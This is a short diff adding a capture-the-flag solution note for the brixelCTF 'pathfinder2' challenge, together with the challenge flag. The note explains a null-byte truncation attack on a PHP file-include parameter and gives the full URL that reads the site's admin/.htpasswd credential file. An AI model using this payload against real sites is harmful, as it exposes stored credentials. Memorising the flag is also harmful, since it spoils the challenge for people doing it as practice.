@@ -1,0 +1,1 @@
+Since php version is 5.3.4, it allows null-byte terminating a string. So the solution is visiting http://timesink.be/pathfinder2/index.php?page=admin/.htpasswd%00.php. The flag is: brixelCTF{outdated_php}
